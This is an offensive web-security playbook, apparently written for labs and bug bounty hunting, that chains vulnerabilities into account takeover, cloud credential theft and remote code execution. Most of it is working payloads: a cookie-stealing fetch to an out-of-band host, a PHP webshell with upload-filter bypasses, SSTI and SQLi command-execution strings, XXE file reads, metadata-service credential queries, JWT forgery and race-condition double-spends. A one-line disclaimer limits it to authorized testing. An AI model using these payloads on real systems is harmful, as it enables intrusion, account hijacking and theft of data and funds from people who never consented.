# Chaining Playbook — turn a primitive into a crown

Single bugs are the floor. **Every finding triggers one question: "what can I do with this NOW?"** This file maps any primitive to its next hop and its eventual crown (RCE / account takeover / mass PII / fund theft), with the concrete payload at each step.

> Authorized lab / CTF / scoped-engagement only.

---

## Primitive → escalation index

| You have… | Next hop | Crown |
|---|---|---|
| Reflected/stored XSS | steal cookie/token; act as victim | **ATO** (+ CORS → cross-origin exfil; + CSRF → forced action) |
| SSRF (any) | `169.254.169.254` IMDS → IAM creds; internal admin | **cloud takeover / RCE** |
| XXE | `SYSTEM` file read; entity → internal URL (SSRF) | source/creds → **RCE / IMDS** |
| SSTI | engine-specific RCE primitive | **RCE** → file read / OS command |
| Deserialization (PHP/Java/Ruby/.NET) | object tamper → gadget chain | **RCE** |
| Prototype pollution | client gadget → DOM XSS; server gadget | **DOM XSS / server RCE / privesc** |
| SQLi | auth bypass / dump / stacked queries | **data dump / `xp_cmdshell` RCE** |
| File upload | webshell / overwrite | **RCE** |
| Path traversal / LFI | read source & config | hardcoded creds → **DB/admin** (+ log poison → RCE) |
| Host-header control | poison password-reset link | **ATO** |
| Open redirect | OAuth `redirect_uri` leak | auth code/token theft → **ATO** |
| Weak/forgeable JWT | forge `sub: administrator` | **admin impersonation** |
| GraphQL introspection | hidden mutation / field-auth gap | **privesc / mass PII** |
| Request smuggling | poison cache / hijack next request | **mass XSS / auth bypass / cred theft** |
| Race window | parallel requests | **double-spend / limit-overrun / MFA bypass** |
| IDOR (read) | PUT/DELETE same object; sibling endpoints | **full data manipulation** |
| CORS reflects Origin+creds | attacker page reads credentialed API | **PII/data theft** |
| Clickjacking | frame a sensitive one-click action | CSRF-style **state change / ATO** |
| Info disclosure (version/.git) | identify framework → known CVE; read secrets | **targeted exploit / cred leak** |

---

## Named kill chains (concrete steps)

### XSS → cookie/token → ATO
**Trigger:** stored or reflected XSS; session cookie without `HttpOnly` (or token reachable in JS/DOM).
1. Confirm execution in context: `"><svg onload=…>` / `'-payload-'`.
2. Exfil: `fetch('//OAST/?c='+encodeURIComponent(document.cookie))` — or if `HttpOnly`, steal CSRF token / make authed requests inline (`fetch('/admin/delete?username=carlos')`).
3. Deliver via exploit server to victim (stored fires automatically).
**Crown:** replay cookie / perform admin action as victim → **ATO**. Folder: `XSS/Exploiting-XSS/`.

### SSRF → IMDS → IAM → cloud
**Trigger:** server fetches a user-supplied URL.
1. Confirm: point at Burp Collaborator → DNS/HTTP hit (blind) or internal response.
2. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → role name.
3. `…/security-credentials/<role>` → `AccessKeyId` / `SecretAccessKey` / `Token`.
4. Use creds against the cloud API (or hit internal `/admin`, `/actuator`, Redis, etc).
**Crown:** **cloud account / internal RCE.** Bypasses (`SSRF/Filter-bypass/`): `127.1`, `[::]`, decimal IP, `localhost.`, DNS rebinding, `@`-trick, redirect to internal.

### XXE → file read / SSRF → IMDS
**Trigger:** XML/SVG/DOCX body accepted.
1. File read: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` → `&e;` in a reflected field.
2. Blind/OOB: external DTD on your server exfiltrates file via parameter entity to OAST.
3. SSRF: `<!ENTITY e SYSTEM "http://169.254.169.254/…">`.
**Crown:** source/creds → **RCE**, or **IMDS → IAM**. Folder: `XXE-injection/`.

### Host header → password-reset poisoning → ATO
**Trigger:** reset email/link built from the `Host` header.
1. `POST /forgot-password` with `username=carlos` and `Host: EXPLOIT-SERVER` (or `X-Forwarded-Host`).
2. Victim's reset link now points at your host; the token hits your access log.
3. Use the genuine reset URL with the stolen token → set carlos's password.
**Crown:** **ATO.** Variant: dangling-markup (`Host: …:'<a href="//EXPLOIT/?`) leaks the body when no token. Folder: `HTTP-Host-header-attacks/Password-reset-poisoning/`.

### OAuth + open redirect → token theft → ATO
**Trigger:** OAuth flow where `redirect_uri` accepts an external host or path-traversal, or app has an open redirect.
1. Confirm `redirect_uri` → your host leaks `code`/`token`; or traverse `…/oauth-callback/../post/next?path=https://EXPLOIT`.
2. Host a fragment-grabber: `window.location='/?'+document.location.hash.substr(1)`.
3. Deliver; collect victim's `code`/`access_token` from your log.
4. Complete the flow: `/oauth-callback?code=STOLEN` or call `/me` with the bearer token.
**Crown:** **ATO** / API-key theft. Folder: `OAuth-authentication/Implicit-flow-and-open-redirect/`.

### SQLi → auth bypass / dump / RCE
**Trigger:** `'` alters the query.
1. Auth bypass: `admin'--` / `' OR 1=1--` in login.
2. Enumerate: `' UNION SELECT NULL,…--` → column count/types → `' UNION SELECT username,password FROM users--`.
3. Blind: boolean / `pg_sleep`/`WAITFOR` / OAST exfil.
4. RCE (MSSQL): `'; EXEC xp_cmdshell '…'--`.
**Crown:** **full DB dump / admin / RCE.** Folder: `SQL-injection/`.

### File upload → webshell → RCE
**Trigger:** upload that lands under web root or is served back.
1. `shell.php` → `<?php system($_GET['c']); ?>`.
2. If filtered: `.phtml`/`.php5`, `Content-Type: image/jpeg`, magic bytes `GIF89a;`, `shell.php%00.jpg`, traversal filename, `.htaccess` to map an extension, polyglot image.
3. Browse the uploaded file → `?c=id`.
**Crown:** **RCE.** Folder: `File-upload-vulnerabilities/`.

### SSTI → RCE
**Trigger:** `${7*7}`/`{{7*7}}` renders `49`.
1. Identify engine via which payload evaluates + the error format.
2. Engine RCE: ERB `<%= system("…") %>`; Tornado `{% import os %}{{os.system('…')}}`; Freemarker `<#assign e="freemarker.template.utility.Execute"?new()>${e("…")}`; Handlebars require-`child_process`; Django `{{settings.SECRET_KEY}}` (then sign cookies).
**Crown:** **RCE / file read.** Folder: `SSTI/`.

### Deserialization → RCE
**Trigger:** cookie/param decodes to a serialized object.
1. Tamper a field (`O:…"admin";b:1`) for logic flaws.
2. Pre-built gadget: ysoserial (Java), phpggc (PHP) → command exec.
3. No library gadget? Build a custom chain from the app's own magic methods (`__wakeup`/`__destruct`).
**Crown:** **RCE.** Folder: `Insecure-deserialization/`.

### Prototype pollution → DOM XSS / server RCE
**Trigger:** `__proto__`/`constructor.prototype` accepted.
1. Client: `?__proto__[transport_url]=data:,alert(1)` (or other gadget) → DOM XSS.
2. Server (Node): detect via `{"__proto__":{"json spaces":10}}` / `status` override; escalate via `execArgv`/`NODE_OPTIONS`/`shell` gadget → command exec; or pollute `isAdmin` for privesc.
**Crown:** **DOM XSS / RCE / privesc.** Folder: `Prototype-pollution/`.

### JWT weakness → admin
**Trigger:** JWT session.
1. Unverified: edit `sub: administrator`, send as-is.
2. `alg:none` + strip signature (keep trailing dot).
3. Weak HMAC: `hashcat -m 16500` → forge with cracked secret.
4. `jwk`/`jku`/`kid` injection; RS256→HS256 confusion using the public key as HMAC secret.
**Crown:** **admin impersonation.** Folder: `JWT-attacks/`.

### GraphQL introspection → hidden mutation → privesc
**Trigger:** `/graphql` reachable.
1. Introspection (bypass: newline after `__schema`, GET, etc.) → full schema.
2. Find credential fields (`getUser{password}`) or privileged mutations (`deleteOrganizationUser`).
3. Alias-batch to beat rate limits (brute login in one request); CSRF via form-urlencoded mutation.
**Crown:** **mass PII / privesc / ATO.** Folder: `GraphQL-API-vulnerabilities/`.

### Smuggling → cache poison / request hijack
**Trigger:** front-end + back-end disagree on request boundaries.
1. CL.TE / TE.CL / H2-desync probe (timeout differential).
2. Smuggle a prefix that captures the next user's request, or that injects a malicious response into the cache.
**Crown:** **mass XSS / auth bypass / credential capture.** Folder: `HTTP-request-smuggling/`.

### Race → double-spend / limit-overrun
**Trigger:** check-then-act on a limited resource (coupon, gift card, withdrawal, signup, OTP).
1. Build N identical requests; fire with a single-packet attack (Turbo Intruder, or Repeater "send group in parallel / single connection").
2. Multiple requests pass the check against the same pre-update state.
**Crown:** **double-spend / one coupon N times / MFA-attempt reset.** Folder: `Race-conditions/`.

### Path traversal → source → creds → DB/admin
**Trigger:** file/path param returns file content.
1. `../../../../etc/passwd` (+ encodings) confirms.
2. Read app source/config (`/var/www/.../config.php`, `application.properties`, `.env`).
3. Extract hardcoded DB/API/admin creds.
**Crown:** **DB access / admin login** (and log-poisoning → RCE on some stacks). Folder: `Path-traversal/`.

### IDOR / access control → mass data + privesc
**Trigger:** object id in request; client-side role checks.
1. Read IDOR: swap id to victim's.
2. Write IDOR: same endpoint with PUT/PATCH/DELETE.
3. Sibling rule: if 9 admin endpoints have auth, test the 10th. Try `?admin=true`, old API version, `X-Original-URL`, method override.
**Crown:** **mass PII / full manipulation / privesc.** Folder: `Access-control/`.

### CORS / clickjacking / CSRF (browser-trust chains)
- **CORS:** `Origin: evil` reflected + `ACAC: true` (or `null` origin) → attacker page `fetch(api,{credentials:'include'})` → exfil. `CORS/`.
- **Clickjacking → CSRF:** frame the target, overlay a decoy over a sensitive one-click action (prefill multistep via params). `Clickjacking/`.
- **CSRF → state change:** no/weak token → auto-submit form changes victim's email → password reset → **ATO**. `CSRF/`.

---

## Cluster-hunt rule

When you confirm bug A:
```
1. CONFIRM A      verify with a real request/response.
2. MAP SIBLINGS   every endpoint in the same controller / module / API group.
3. TEST SIBLINGS  apply A's pattern to each (the dev repeats mistakes).
4. CHAIN          if a sibling has a different class, combine A + B.
5. QUANTIFY       "affects N users", "exposes $X", "N records".
6. REPORT ONE CHAIN  not many bugs. Chains pay 3–10× more and are harder to dismiss.
```

Every hop above links to a topic folder — open it for the full 13-section walkthrough, payload arsenal, and bypass tables.
